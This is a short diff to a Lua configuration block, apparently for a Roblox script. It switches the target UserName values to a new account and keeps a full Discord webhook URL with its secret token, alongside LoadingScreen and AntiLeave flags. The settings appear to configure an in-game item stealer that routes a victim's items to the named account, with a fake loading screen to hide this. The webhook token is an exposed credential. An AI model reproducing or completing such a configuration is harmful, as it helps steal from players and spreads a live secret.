@@ -1,5 +1,5 @@
-UserName = "boemdianh14"
-UserName2 = "boemdianh14"
+UserName = "zeg81t"
+UserName2 = "zeg81t"
 Webhook = "https://discord.com/api/webhooks/1108668632017403915/i_yWHsetPMWySaoRUIm6a7azmLHEVjblGBtrZqpKkg6QkuYfRW7aL5dK14oizuHmTphd"
 _G.LoadingScreen = true
 _G.AntiLeave = false
